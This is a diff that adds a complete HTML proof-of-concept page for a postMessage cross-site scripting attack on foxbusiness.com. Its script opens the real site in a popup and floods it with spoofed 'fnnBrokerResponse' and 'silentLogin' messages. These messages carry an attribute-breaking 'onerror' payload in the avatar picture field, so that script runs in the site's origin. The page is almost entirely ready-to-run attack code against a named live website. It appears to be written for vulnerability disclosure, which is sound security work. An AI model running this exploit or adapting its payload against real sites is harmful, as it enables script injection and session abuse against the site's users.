@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>foxbusiness.com XSS PoC</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 560px; margin: 2rem auto; padding: 0 1rem; }
+    h1 { font-size: 1.25rem; }
+    p { color: #444; }
+    button { padding: 0.5rem 1rem; cursor: pointer; }
+  </style>
+</head>
+<body>
+<h1>foxbusiness.com PostMessage XSS</h1>
+<p>Opens foxbusiness.com in a new tab and floods postMessage with spoofed <code>fnnBrokerResponse</code> / <code>silentLogin</code> to trigger avatar XSS. Allow popups.</p>
+<button onclick="launchAttack()">Launch XSS</button>
+<script>
+var targetWin, flood;
+
+function msg(name, data) {
+    return {
+        type: 'fnnBrokerResponse',
+        name: name,
+        origin: 'https://www.foxbusiness.com',
+        data: data
+    };
+}
+
+function xssPayload() {
+    return {
+        authenticated: true,
+        userInfo: {
+            'https://foxnews.com/picture': '" onerror="alert(document.domain)" x="',
+            'https://foxnews.com/name': 'XSS',
+            'https://foxnews.com/email': 'xss@poc.com',
+            'https://foxnews.com/uuid': 'poc-uuid'
+        },
+        token: 'x',
+        anon: {
+            segment: {
+                lastKnownProfileId: 'a',
+                lastAnonymousProfileId: 'a',
+                dcg_profile_id: 'a'
+            },
+            value: 'a'
+        }
+    };
+}
+
+function send(win) {
+    var t = 'https://www.foxbusiness.com';
+    win.postMessage(msg('ready', null), t);
+    win.postMessage(msg('hasPendingPasswordless', false), t);
+    win.postMessage(msg('silentLogin', xssPayload()), t);
+}
+
+function launchAttack() {
+    targetWin = window.open('https://www.foxbusiness.com/', '_blank');
+    if (!targetWin) { alert('Allow popups'); return; }
+
+    flood = setInterval(function() {
+        try { send(targetWin); } catch(e) {}
+    }, 10);
+
+    setTimeout(function() {
+        clearInterval(flood);
+        flood = setInterval(function() {
+            try { send(targetWin); } catch(e) {}
+        }, 50);
+    }, 2000);
+
+    setTimeout(function() { clearInterval(flood); }, 15000);
+}
+</script>
+</body>
+</html>
